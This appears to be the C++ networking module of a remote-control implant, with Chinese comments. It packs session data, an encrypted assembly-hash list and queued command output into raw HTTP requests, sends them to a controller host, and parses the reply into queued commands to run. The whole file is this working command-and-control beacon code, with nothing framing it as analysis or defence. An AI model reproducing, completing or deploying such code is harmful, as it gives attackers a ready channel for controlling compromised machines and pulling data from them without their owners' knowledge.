#include <queue>
#include <iostream>
#include <ws2tcpip.h>

#include "Cryptor.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// 命令数据 / 命令输出数据
struct ConnectData {
	char* data;
	int dataLength;
};

// 构造请求包
void ConstructRequestPackage(char** pRequestPackage, int* pRequestPackageLength, char* requestHeader, char* sessionInfo, int sessionInfoLength, char* selfAsmHashInfo, queue<ConnectData>& commandOutputDataQueue) {
	char* sessionData = (char*)malloc(1300);
	int sessionDataLength = 0;

	// 填充“会话信息”: 长度\0会话信息
	char outputDataLength[10] = "";
	sprintf_s(outputDataLength, sizeof(outputDataLength), "%d", sessionInfoLength);
	memcpy(sessionData + sessionDataLength, outputDataLength, strlen(outputDataLength) + 1);
	sessionDataLength += strlen(outputDataLength) + 1;

	memcpy(sessionData + sessionDataLength, sessionInfo, sessionInfoLength);
	sessionDataLength += sessionInfoLength;

	// 填充“自定义汇编哈希信息”: 长度\0,自定义汇编哈希,自定义汇编哈希,...
	int selfAsmHashInfoLength = strlen(selfAsmHashInfo);
	sprintf_s(outputDataLength, sizeof(outputDataLength), "%d", selfAsmHashInfoLength);
	memcpy(sessionData + sessionDataLength, outputDataLength, strlen(outputDataLength) + 1);
	sessionDataLength += strlen(outputDataLength) + 1;

	memcpy(sessionData + sessionDataLength, selfAsmHashInfo, selfAsmHashInfoLength);
	EncryptData(sessionData + sessionDataLength, selfAsmHashInfoLength);
	sessionDataLength += selfAsmHashInfoLength;

	// 填充“命令输出数据”: 长度\0命令ID\0输出数据 + 长度\0命令ID\0输出数据 + ...
	while (commandOutputDataQueue.size()) {
		// 命令输出数据 <- 命令输出数据队列
		sessionData = (char*)realloc(sessionData, sessionDataLength + commandOutputDataQueue.front().dataLength + 50);

		sprintf_s(outputDataLength, sizeof(outputDataLength), "%d", commandOutputDataQueue.front().dataLength);
		memcpy(sessionData + sessionDataLength, outputDataLength, strlen(outputDataLength) + 1);
		sessionDataLength += strlen(outputDataLength) + 1;

		memcpy(sessionData + sessionDataLength, commandOutputDataQueue.front().data, commandOutputDataQueue.front().dataLength);
		sessionDataLength += commandOutputDataQueue.front().dataLength;

		free(commandOutputDataQueue.front().data);
		commandOutputDataQueue.pop();
	}

	// 构造完整请求包: 请求头 + Content-Length + \r\n\r\n + 会话信息 + 自定义汇编哈希信息 + 命令输出数据 + 随机数
	char requestContentLength[10] = "";
	sprintf_s(requestContentLength, sizeof(requestContentLength), "%d", sessionDataLength);

	*pRequestPackageLength = strlen(requestHeader) + strlen(requestContentLength) + 4 + sessionDataLength;
	*pRequestPackage = (char*)malloc(*pRequestPackageLength);

	sprintf_s(*pRequestPackage, *pRequestPackageLength, "%s%s\r\n\r\n", requestHeader, requestContentLength);
	memcpy(*pRequestPackage + *pRequestPackageLength - sessionDataLength, sessionData, sessionDataLength);
	free(sessionData);
}

// 接收“命令数据”
int ReceiveCommandData(SOCKET clientSocket, queue<ConnectData>& commandDataQueue) {
	// 接收响应包
	char* responsePackage = (char*)malloc(5000);
	int recvLength = 0;
	int currentRecvLength = 0;
	while ((currentRecvLength = recv(clientSocket, responsePackage + recvLength, 5000, 0)) > 0) {
		recvLength += currentRecvLength;
		responsePackage = (char*)realloc(responsePackage, recvLength + 5000);
	}
	if (currentRecvLength == SOCKET_ERROR) {
		return 0;
	}

	// 解析响应头
	int responseContentLength;
	char* partHeader = strstr(responsePackage, "Content-Length");
	if (partHeader) {
		char* contentLengthLast = strchr(partHeader, '\r');
		*contentLengthLast = '\0';
		responseContentLength = atoi(partHeader + 16);
		*contentLengthLast = '\r';
	}
	else {
		free(responsePackage);
		return 0;
	}

	// 解析“命令数据”
	if (responseContentLength > 0) {
		char* responseCommandData = strstr(responsePackage, "\r\n\r\n") + 4;
		int parseIndex = 0;
		while (parseIndex < responseContentLength) {
			int dataLength = atoi(responseCommandData + parseIndex);
			parseIndex += strlen(responseCommandData + parseIndex) + 1;
			char* data = (char*)malloc(dataLength);
			memcpy(data, responseCommandData + parseIndex, dataLength);
			parseIndex += dataLength;

			// 命令数据 -> 命令数据队列
			ConnectData commandData = {};
			commandData.data = data;
			commandData.dataLength = dataLength;
			commandDataQueue.push(commandData);
		}
	}
	free(responsePackage);
	return 1;
}

// HTTP 请求 (发送“命令输出数据”& 接收“命令数据”)
void HttpRequest(char* host, int port, char* requestHeader, char* sessionInfo, int sessionInfoLength, char* selfAsmHashInfo, queue<ConnectData>& commandDataQueue, queue<ConnectData>& commandOutputDataQueue) {
	// 构造请求包
	char* requestPackage;
	int requestPackageLength;
	ConstructRequestPackage(&requestPackage, &requestPackageLength, requestHeader, sessionInfo, sessionInfoLength, selfAsmHashInfo, commandOutputDataQueue);

	// 初始化库
	WSADATA lpWSAData;
	if (WSAStartup(MAKEWORD(2, 2), &lpWSAData)) {
		return;
	}
	// 创建 IPv4 + TCP 套接字
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		WSACleanup();
		return;
	}
	// 通过套接字建立连接
	sockaddr_in sockaddress;
	sockaddress.sin_family = AF_INET;
	sockaddress.sin_port = htons(port);
	if (!inet_pton(AF_INET, host, &(sockaddress.sin_addr))) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}
	if (connect(clientSocket, (sockaddr*)&sockaddress, sizeof(sockaddress))) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	// 发送“命令输出数据”
	if (send(clientSocket, requestPackage, requestPackageLength, 0) == SOCKET_ERROR) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}
	free(requestPackage);

	// 接收“命令数据”
	if (!ReceiveCommandData(clientSocket, commandDataQueue)) {
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	closesocket(clientSocket);
	WSACleanup();
}